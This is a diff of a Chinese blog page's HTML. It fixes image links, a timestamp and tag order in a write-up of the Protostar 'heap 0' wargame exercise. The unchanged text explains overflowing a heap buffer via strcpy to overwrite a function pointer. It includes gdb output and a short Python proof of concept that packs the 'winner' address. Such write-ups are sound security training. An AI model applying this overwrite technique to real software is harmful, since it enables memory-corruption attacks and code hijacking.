@@ -18,15 +18,15 @@
 <meta property="og:description" content="0x00 序学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。
 0x01 heap0C代码
 12345678910111213141516171819202122232425262728293031323334353637383940#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unis">
-<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-0.png">
-<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-1.png">
-<meta property="og:updated_time" content="2017-04-20T13:49:00.000Z">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-0.png?raw=true">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-1.png?raw=true">
+<meta property="og:updated_time" content="2017-04-20T13:53:24.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Protostar-堆溢出系列学习-heap 0">
 <meta name="twitter:description" content="0x00 序学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。
 0x01 heap0C代码
 12345678910111213141516171819202122232425262728293031323334353637383940#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unis">
-<meta name="twitter:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-0.png">
+<meta name="twitter:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-0.png?raw=true">
   
     <link rel="alternative" href="/atom.xml" title="4chendy" type="application/atom+xml">
   
@@ -235,12 +235,12 @@
 <p>每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过<code>addr-4</code>拿到自身的分配大小从而决定下次分配的选择</p>
 <p><strong>注：分配大小的第一位表示前面的内存块是否在使用</strong></p>
 <h2 id="0x04-调试-amp-hack"><a href="#0x04-调试-amp-hack" class="headerlink" title="0x04 调试&amp;hack"></a>0x04 调试&amp;hack</h2><p>通过前面的分析，我们的目的很明确，需要通过<code>strcpy(d-&gt;name, argv[1]);</code>去重写fp结构体里面的函数指针，使其为<code>winner</code>函数的地址。</p>
-<p>1.利用gdb查看strcpy前后堆的情况<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-0.png" alt="0-0"><br>我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的<code>nowinner</code>地址改为<code>winner</code>地址</p>
+<p>1.利用gdb查看strcpy前后堆的情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-0.png?raw=true" alt="0-0"><br>我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的<code>nowinner</code>地址改为<code>winner</code>地址</p>
 <p>2.查看<code>winner</code>地址，重写fp函数指针</p>
 <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) p winner </div><div class="line">$<span class="number">1</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span>)&#125; <span class="number">0x8048464</span> &lt;winner&gt;</div></pre></td></tr></table></figure>
 <p>3.PoC Python脚本</p>
 <figure class="highlight golo"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">padding = <span class="string">"A"</span>*<span class="number">64</span> <span class="comment">#填充data</span></div><div class="line">head = <span class="string">"BBBB"</span>  <span class="comment"># not care</span></div><div class="line">head += <span class="string">"CCCC"</span> <span class="comment"># not care</span></div><div class="line">winner = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8048464</span>) <span class="comment">#将nowinner地址改为winner地址</span></div><div class="line"><span class="keyword">print</span> padding+head+winner</div></pre></td></tr></table></figure>
-<p>4.hack<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-1.png" alt="0-1"><br>成功执行<code>winner</code>函数!</p>
+<p>4.hack<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-1.png?raw=true" alt="0-1"><br>成功执行<code>winner</code>函数!</p>
 
       
 
@@ -476,19 +476,19 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">macOS内核</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">mach</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">vtable</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">macOS内核</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">mach</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -516,6 +516,18 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">调试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Crackme</a>
               </li>
              
@@ -537,18 +549,6 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">stub</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">调试</a>
               </li>
              
               <li class="article-tag-list-item">
